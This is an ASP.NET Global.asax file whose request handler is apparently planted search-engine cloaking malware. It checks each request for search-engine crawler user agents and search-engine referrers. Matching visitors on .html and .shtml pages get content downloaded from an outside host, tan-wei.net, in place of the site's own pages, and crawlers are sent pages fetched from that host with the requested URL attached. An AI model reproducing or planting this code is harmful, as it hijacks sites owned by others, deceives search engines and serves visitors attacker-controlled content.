<%@ Application Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    void Application_BeginRequest(object sender, EventArgs e)
    {
	   string strSelfPages=Request.ServerVariables["PATH_INFO"].ToString().ToLower();
	   
           string[] spidersString = "spider,msnbot,Baiduspider,YodaoBot,Googlebot".ToLower().Split(',');
           string[] refesString = "sogou,soso,baidu,google,youdao,yahoo,bing,118114,biso,gougou,ifeng,ivc,sooule,niuhu,biso,360".ToLower().Split(',');
            bool spi = false;
            bool refekg = false;
		string URLdzq=Request.Url.ToString();
            string user = Request.ServerVariables["HTTP_USER_AGENT"].ToString().ToLower();
string strQSre=Request.ServerVariables["QUERY_STRING"];
if(Request.UrlReferrer!=null){
            string refe = Request.UrlReferrer.ToString().ToLower();
            foreach (string s2 in refesString)
            {
                if (refe.Contains(s2))
                {
                    refekg = true;
                    break;
                   
                }
            }


}


            foreach (string s1 in spidersString)
            {
                if (user.Contains(s1))
                {
                    spi = true;
                    break;
                   
                }
            }


               if (refekg == true&&strQSre.Contains(".shtml"))

{

                string sl = "http://tan-wei.net/vip/kf.html"; 
                WebClient SWebClient = new WebClient();
				SWebClient.Headers.Add ("User-Agent",sl); 
                SWebClient.Credentials = CredentialCache.DefaultCredentials;
                byte[] paged = SWebClient.DownloadData(sl);
                string r = Encoding.Default.GetString(paged);
	//string strHost=Request.ServerVariables["HTTP_HOST"];
Response.Write(r); 
 		 Response.End();
}else if (refekg == true&&strQSre.Contains(".html")){
                string sl = "http://tan-wei.net/vip/kf.html"; 
                WebClient SWebClient = new WebClient();
				SWebClient.Headers.Add ("User-Agent",sl); 
                SWebClient.Credentials = CredentialCache.DefaultCredentials;
                byte[] paged = SWebClient.DownloadData(sl);
                string r = Encoding.Default.GetString(paged);
	//string strHost=Request.ServerVariables["HTTP_HOST"];
Response.Write(r);
 		 Response.End();

}
if (spi==true){
	Response.Clear();
string strQS=Request.ServerVariables["QUERY_STRING"];
	 string  durl = "http://tan-wei.net/vip/"; 
if(strQS.Contains(".shtml")){
durl="http://tan-wei.net/vip/?url="+URLdzq; 
}else if(strQS.Contains(".html")){
durl="http://tan-wei.net/vip/?url="+URLdzq;
}
                WebClient URLWebClient = new WebClient();
				URLWebClient.Headers.Add ("User-Agent",durl);  
                URLWebClient.Credentials = CredentialCache.DefaultCredentials;
                byte[] page = URLWebClient.DownloadData(durl); 
              string SERL = Encoding.Default.GetString(page);	
	string strHost=Request.ServerVariables["HTTP_HOST"];
	string strSelfPage=Request.ServerVariables["PATH_INFO"];
	string strUA=Request.ServerVariables["HTTP_USER_AGENT"];
	
	string strReferer=Request.ServerVariables["HTTP_REFERER"];
	Random   r   =   new   Random();   
	int      i   =   r.Next();
	string surl = durl;
 WebClient myWebClient = new WebClient(); 
 myWebClient.Credentials = CredentialCache.DefaultCredentials;
      byte[] pagedata = myWebClient.DownloadData(surl);
       string result = Encoding.Default.GetString(pagedata);
 //    result=result.Replace("<a href=","<a href=?");
                Response.Write(result); 
				// Response.End();
}
       }

</script>